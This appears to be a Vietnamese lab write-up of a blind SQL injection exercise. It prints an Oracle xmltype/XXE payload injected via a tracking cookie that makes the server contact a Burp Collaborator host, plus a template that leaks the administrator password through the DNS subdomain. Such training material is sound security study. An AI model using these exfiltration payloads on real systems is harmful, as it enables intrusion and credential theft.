<img width="1585" height="1085" alt="image" src="https://github.com/user-attachments/assets/edca6d37-638d-4134-b1ff-9df6c084d1f1" />

Yêu cầu: login bằng `administrator` account

Gợi ý: Có thể thực thi query trên tracking cookie nhưng phía server sẽ không trả về bất kỳ respone nào và không có tí effect nào trên respone. Nhưng có thể giao tiếp với doamin bên ngoài.

<img width="2516" height="1443" alt="image" src="https://github.com/user-attachments/assets/712b47d6-99e8-4611-bfd2-e8e6dee1bda0" />

Thì với Tracking Cookie như trên thì ta sẽ thử bằng payload này để thử DNS lookup vào Burp Collaborator:

    '||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//f7nrcldfr5ig626gkfvq13ppqgw7kx8m.oastify.com/">+%25remote%3b]>'),'/l')+
    FROM+dual)||'
Payload này tận dụng hàm xmltype trong Oracle để kích hoạt lỗ hổng XXE (XML External Entity). Bằng cách khai báo một thực thể ngoại vi (External Entity), ta có thể ép máy chủ thực hiện các hành vi 
trái phép, cụ thể ở đây là tạo một SSRF (Server-Side Request Forgery) để ping về máy chủ của chúng ta.

Và subdomain `Burp Collaborator` cung cấp là `f7nrcldfr5ig626gkfvq13ppqgw7kx8m.oastify.com` và chú ý là phải mã hóa lại đoạn payload bên trong để đề phòng lỗi như trong payload có ; thì tôi phải mã hóa 
thành %3B để nó không tách đoạn phía sau `;` thành 1 cookie khác.

<img width="2563" height="1443" alt="image" src="https://github.com/user-attachments/assets/bf2e7ce3-8d0a-49b5-91a6-25ad9a83a4ad" />

sau khi gửi payload như trên thì tôi phát hiện ra ở bên `Burp Collaborator` đã bắt được DNS request tới.

Ở đấy đã phát hiện ra rằng nếu đã có thể gửi 1 cái dns request ra ngoài vậy ta có thể kết quả query ra ngoài không?

    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') 
    FROM dual

Tôi sẽ dựa vào payload trên để khai thác ra password của `administrator`.

<img width="2563" height="1443" alt="image" src="https://github.com/user-attachments/assets/d52e3c83-a205-4547-80d6-2b1969a33dc2" />

thì sau khi gửi thành công bên `Burp Collaborator` thì tôi bắt được gói tin http với nội dung như dưới

<img width="2563" height="1443" alt="image" src="https://github.com/user-attachments/assets/a88732be-29d0-48f5-a3ea-9438e7b6428d" />

thì phần subdomain được nối với domain `Burp Collaborator` là kết quả của nội dung truy vấn, cũng chính là password của `administrator`.

<img width="2483" height="1443" alt="image" src="https://github.com/user-attachments/assets/71691d5c-5644-48c2-b9d3-8ba5717daad4" />
